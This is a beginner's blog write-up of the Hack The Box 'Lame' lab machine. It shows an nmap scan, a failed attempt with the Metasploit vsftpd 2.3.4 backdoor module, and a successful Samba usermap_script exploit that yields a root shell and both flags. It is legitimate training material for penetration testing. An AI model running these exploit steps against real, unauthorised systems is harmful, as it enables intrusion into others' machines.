# Title: Lame
  Date: 2019-10-11

This box is rated very easy, probably the easiest there is. I've played with HTB a bit but never really focused much on it. I'm planning to work through the boxes starting with the easiest. I've done a few but have always been _very_ bad at documenting things. So this is my first actual writeup. 

## Enumeration

Kicked things off with a quick port scan with service detection, which returned the following:

```
$ sudo nmap -sV -sS -T4 lame 
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-11 14:33 CDT
Nmap scan report for lame (10.10.10.3)
Host is up (0.094s latency).
Not shown: 996 filtered ports
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.3.4
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

## FTP Red Herring? Or bad hacker?

The first thing I did was check out the ftp server. I was able to log in anonymously and noticed the server was vsFTPd v2.3.4. I recognized this as a pretty cool possible vulnerability and think I may have actually used it for a CTF challenge I built a few years back. Here is the background on the exploit:

> This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011. 

This was not a security hole in vsFTPd itself. A hacker compromised the download site and uploaded their own code that included a backdoor. So if the software was downloaded and installed during that time frame, the backdoor was there.

I then kicked off Metasploit (msfconsole) and searched for vsftpd:

```
msf5 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution
```

Selected the exploit:

```
msf5 > use exploit/unix/ftp/vsftpd_234_backdoor
```

Looked at the options:

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > show options 

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   21               yes       The target port (TCP)
```

Set the RHOSTS to the lame IP (I added an entry to my hosts file to make life easier):

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts lame
rhosts => lame
```
And then kicked off the exploit:

```
msf5 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

The exploit didn't work out of the box so I moved on thinking maybe this was a trick and the vulnerable version of the server was not installed. Since this box is rated super easy I figured it wouldn't take that much work.

## Samba

I moved on to the Samba shares. I first used the __Impacket__ (https://github.com/SecureAuthCorp/impacket) smbclient.py script to try connecting:

```
smbclient.py lame
```

I found some shares but nothing really very interesting on them. I also ran "enum4linux" on the box but didn't really make it to going through the results because while it was running I moved on to just doing a bit of research and searched "exploit open smb share". I came across this site: 
https://resources.infosecinstitute.com/hacking-and-gaining-access-to-linux-by-exploiting-samba-service/#gref 

I ran through the Metasploit commands and was kinda shocked when a shell just popped. 

I ran through the following:

```
use auxiliary/scanner/smb/smb_version
...set up options and executed...
```

and then:

```
use exploit/multi/samba/usermap_script
...set up options and executed...
```

To my surprise running this popped a shell?! I was kind of blindly following the site and didn't realize it would actually work.

## User flag

Once I got the shell I found the user flag under /home/makis

## Root flag

I ran "whoami" and was surprised that I'd popped a root shell. The root flag was surprisingly in the /root folder.

## Endnotes

I'm curious to go take a look at other writeups for this one. I have a feeling there are several paths to take.

Here are the details on the Samba exploit that surprised me:

> This module exploits a command execution vulnerability in Samba versions 3.0.20 through 3.0.25rc3 when using the non-default "username map script" configuration option. By specifying a username containing shell meta characters, attackers can execute arbitrary commands. No authentication is needed to exploit this vulnerability since this option is used to map usernames prior to authentication! 